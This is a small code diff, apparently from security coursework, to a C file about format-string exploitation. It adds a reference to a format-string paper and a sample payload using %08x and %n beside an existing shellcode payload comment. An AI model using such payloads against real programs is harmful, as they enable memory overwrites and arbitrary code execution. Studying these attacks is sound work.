@@ -2,6 +2,7 @@
 
 // Exploit by overflowing the buffer and using the %p mark
 // to get the actual memory address.
+// Ref: https://cs155.stanford.edu/papers/formatstring-1.2.pdf
 
 int main () {
 
@@ -24,7 +25,7 @@ int main () {
   
   /* Sample payloads
   %400s : "%497d\x3c\xd3\xff\xbf<nops><shellcode>"
-  
+        : "\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n"
   
   */
 }
